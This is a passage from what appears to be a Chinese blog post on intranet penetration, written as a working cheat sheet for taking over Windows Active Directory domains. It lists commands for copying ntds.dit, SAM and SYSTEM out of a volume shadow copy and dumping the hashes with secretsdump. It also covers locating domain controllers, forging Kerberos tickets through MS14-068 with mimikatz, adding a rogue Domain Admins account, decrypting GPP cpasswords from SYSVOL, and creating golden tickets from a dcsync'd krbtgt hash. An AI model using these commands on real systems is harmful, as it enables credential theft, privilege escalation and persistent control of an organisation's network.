<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure>

<p>获得Shadow Copy Volume Name为?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47</p>
<p>复制ntds.dit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47\windows\NTDS\ntds.dit c:\ntds.dit    copy第一个参数为创建快照时位置</span><br></pre></td></tr></table></figure>

<p>复制system和sam</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47\windows\system32\config\system c:\</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy47\windows\system32\config\sam c:\</span><br></pre></td></tr></table></figure>

<p>删除快照</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure>

<p>获取将以上system，sam, ntds.dit 放到 /root/ntds_cracking/下，运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/SYSTEM LOCAL -outputfile  hash.txt</span><br></pre></td></tr></table></figure>

<p>安装：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone  https://github.com/CoreSecurity/impacket.git</span><br><span class="line">cd impacket-master/</span><br><span class="line">python setup.py  install</span><br></pre></td></tr></table></figure>

<p>py地址 <a target="_blank" rel="noopener" href="https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py">https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py</a> 参考：<a target="_blank" rel="noopener" href="http://www.4hou.com/technology/10573.html">域渗透——获得域控服务器的NTDS.dit文件</a></p>
<h5 id="dc定位"><a href="#dc定位" class="headerlink" title="dc定位"></a>dc定位</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nltest dclist:xx.xx</span><br><span class="line">net time /domain</span><br><span class="line">systeminfo 中的domain</span><br><span class="line">ipconfig /all 中的DNS Suffix Search List</span><br><span class="line">扫描53端口，找dns位置</span><br><span class="line">C:\jboss-5.1.0.GA\bin\&gt;set log</span><br><span class="line">LOGONSERVER=\\DC01</span><br><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line">PowerView Get-NetDomainController</span><br><span class="line">PowerView地址https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</span><br></pre></td></tr></table></figure>

<h3 id="windows-log"><a href="#windows-log" class="headerlink" title="windows log"></a>windows log</h3><p>微软第三方信息收集工具LogParser.exe psloglist.exe等</p>
<h3 id="powerhsell神器"><a href="#powerhsell神器" class="headerlink" title="powerhsell神器"></a>powerhsell神器</h3><p>nishang <a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
<p>spn扫描 <a target="_blank" rel="noopener" href="https://github.com/nullbind/Powershellery/tree/master/Stable-ish">https://github.com/nullbind/Powershellery/tree/master/Stable-ish</a></p>
<p>PowerSploit <a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p>
<p>针对ps的Empire <a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a></p>
<h3 id="ms14-068-Kerberos漏洞利用："><a href="#ms14-068-Kerberos漏洞利用：" class="headerlink" title="ms14-068 Kerberos漏洞利用："></a>ms14-068 Kerberos漏洞利用：</h3><p>生成TGT：用于伪造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br><span class="line">                      用户@ 域名                 用户sid    域主机</span><br><span class="line">python ms14068.py -u admin@xxx.com -p password -s sid -d dc.xxx.com</span><br><span class="line">ms14068.exe -u admin@xxx.com -p password -s sid -d dc.xxx.com</span><br></pre></td></tr></table></figure>

<p>会生成<a href="mailto:&#84;&#x47;&#x54;&#95;&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x78;&#x78;&#120;&#46;&#99;&#111;&#x6d;&#46;&#99;&#99;&#97;&#x63;&#104;&#101;">&#84;&#x47;&#x54;&#95;&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x78;&#x78;&#120;&#46;&#99;&#111;&#x6d;&#46;&#99;&#99;&#97;&#x63;&#104;&#101;</a></p>
<p>注入TGT：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br><span class="line">klist purge 清除所有凭证，等一会在执行下列命令(https://www.t00ls.net/thread-28727-1-1.html)</span><br><span class="line">写入内存 mimikatz.exe &quot;kerberos::ptc c:\TGT_admin@xxx.com.ccache&quot;</span><br></pre></td></tr></table></figure>

<p>若成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc.xxx.com\c$</span><br><span class="line">net user admin xxxxx@password /add /domain</span><br><span class="line">net group &quot;Domain Admins&quot; admin /add /domain</span><br></pre></td></tr></table></figure>

<p>msf ms14_048_kerberos_checksum模块也可以检测 工具： <a target="_blank" rel="noopener" href="https://www.t00ls.net/viewthread.php?tid=28207&amp;from=favorites">https://www.t00ls.net/viewthread.php?tid=28207&amp;from=favorites</a> <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p>
<h3 id="GPP漏洞利用"><a href="#GPP漏洞利用" class="headerlink" title="GPP漏洞利用"></a>GPP漏洞利用</h3><p>win2008增加，一般域用户都可访问敏感文件<br>密码存在SYSCOL目录下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Groups.xml, 这个文件是域管通过GPP设置或修改本地密码留下的</span><br><span class="line">Services\Services.xml,</span><br><span class="line">ScheduledTasks\ScheduledTasks.xml,</span><br><span class="line">Printers\Printers.xml,</span><br><span class="line">Drives\Drives.xml,</span><br><span class="line">DataSources\DataSources.xml</span><br><span class="line">net use \\域控(如pc.xx.com) password /user:xxx.com\username </span><br><span class="line">dir \\域控\SYSVOL /s /a &gt; sysvol.txt</span><br><span class="line">findstr /i &quot;groups.xml&quot; sysvol.txt</span><br></pre></td></tr></table></figure>

<p>找到cpassword<br>解密过程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set-executionPolicy bypass</span><br><span class="line">powershell -ep bypass     启动ps</span><br><span class="line">Import-Module .\GPP.ps1</span><br><span class="line">Get-DecryptedCpassword  xxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>

<p>脚本link：<br><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</a></p>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">利用SYSVOL还原组策略中保存的密码</a></p>
<h3 id="黄金票据-维权"><a href="#黄金票据-维权" class="headerlink" title="黄金票据(维权)"></a>黄金票据(维权)</h3><p>域用户sid</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure>

<p>krbtgt hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;lsadump::dcsync /domain:xx.com /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>

<p>域管<br>net group “domain admins” /domain 这里是administrator</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;kerberos::purge&quot;</span><br><span class="line">&quot;kerberos::golden /admin:administrator /domain:xx.com /sid:S-1-5-..... /krbtgt:hash /ticket:Adminstrator.kiribi&quot;</span><br><span class="line">&quot;kerberos::ptt Administrator.kiribi&quot;</span><br><span class="line">&quot;kerberos::tgt&quot;</span><br></pre></td></tr></table></figure>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime" title="更新时间"></i>
              2021-12-20 15:24:01
            </span>
            
                  <span class="post-tags">
                    <i class="iconfont icon-tags" title="标签"></i>
                    
                    <span class="span--tag">
                      <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
                        <b>#</b> 内网渗透
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E6%94%B6%E9%9B%86"><span class="toc-text">前期收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4"><span class="toc-text">一些命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3389"><span class="toc-text">3389</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0user"><span class="toc-text">添加user</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E8%97%8Fwin%E8%B4%A6%E6%88%B7"><span class="toc-text">隐藏win账户</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9%EF%BC%8C%E8%BD%AC%E5%8F%91"><span class="toc-text">反弹，转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-bash"><span class="toc-text">linux bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ngrok-backdoor"><span class="toc-text">ngrok-backdoor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#veil"><span class="toc-text">veil</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ew"><span class="toc-text">ew</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc"><span class="toc-text">nc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lcx"><span class="toc-text">lcx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#netsh-win%E8%87%AA%E5%B8%A6-%E5%8F%AA%E6%94%AF%E6%8C%81tcp-360%E6%8B%A6"><span class="toc-text">netsh win自带(只支持tcp)360拦</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#go-msf-amp-py-msf-bypass360"><span class="toc-text">go+msf &amp; py+msf bypass360</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#msf"><span class="toc-text">msf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Msf%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-%E6%B5%8B%E8%AF%95win10%E6%B2%A1%E6%88%90%E5%8A%9F-win2008-%E5%8F%AF%E4%BB%A5%EF%BC%8C360%E4%BC%9A%E6%8B%A6"><span class="toc-text">Msf进程注入(测试win10没成功,win2008 可以，360会拦)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Msf-hash"><span class="toc-text">Msf hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Msf%E7%9A%84%E6%8C%81%E7%BB%AD%E5%90%8E%E9%97%A8"><span class="toc-text">Msf的持续后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Msf-powershell"><span class="toc-text">Msf powershell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Msf-Router"><span class="toc-text">Msf Router</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Msf%E6%89%AB%E6%8F%8F"><span class="toc-text">Msf扫描</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Msf%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91portfwd"><span class="toc-text">Msf端口转发portfwd</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Msf%E6%88%AA%E5%B1%8F-%E6%B2%A1%E8%A2%AB360%E6%8B%A6%E6%B2%A1%E6%8F%90%E7%A4%BA%EF%BC%8C%E6%88%96%E8%AE%B8%E6%9C%89%E6%84%8F%E5%A4%96%E6%94%B6%E8%8E%B7"><span class="toc-text">Msf截屏(没被360拦没提示，或许有意外收获)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Msf%E5%97%85%E6%8E%A2"><span class="toc-text">Msf嗅探</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="toc-text">键盘记录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">远程命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ipc"><span class="toc-text">ipc$</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Schtasks"><span class="toc-text">Schtasks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#psexec"><span class="toc-text">psexec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wmi-135"><span class="toc-text">wmi(135)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#wmiexec"><span class="toc-text">wmiexec</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#winexe"><span class="toc-text">winexe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PsRemoting"><span class="toc-text">PsRemoting</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz-procdump-%E8%8E%B7%E5%BE%97%E5%86%85%E5%AD%98-hash"><span class="toc-text">mimikatz + procdump 获得内存 hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SAM-hash"><span class="toc-text">SAM-hash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pass-the-hash"><span class="toc-text">pass the hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pass-the-key"><span class="toc-text">pass the key</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pass-the-ticket"><span class="toc-text">pass the ticket</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ntds-dit"><span class="toc-text">ntds.dit</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dc%E5%AE%9A%E4%BD%8D"><span class="toc-text">dc定位</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-log"><span class="toc-text">windows log</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powerhsell%E7%A5%9E%E5%99%A8"><span class="toc-text">powerhsell神器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms14-068-Kerberos%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-text">ms14-068 Kerberos漏洞利用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GPP%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">GPP漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE-%E7%BB%B4%E6%9D%83"><span class="toc-text">黄金票据(维权)</span></a></li></ol>
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
  </div>


        <div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/17year">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="wechat" href="">
            <i class="iconfont icon-wechat"></i>
          </a>
        </li>
      
        <li>
          <a title="weibo" href="">
            <i class="iconfont icon-weibo"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © Oranges 2021</a>
        
    </div>
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        


        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        

      </div>
    </div>
  </body>
</html>
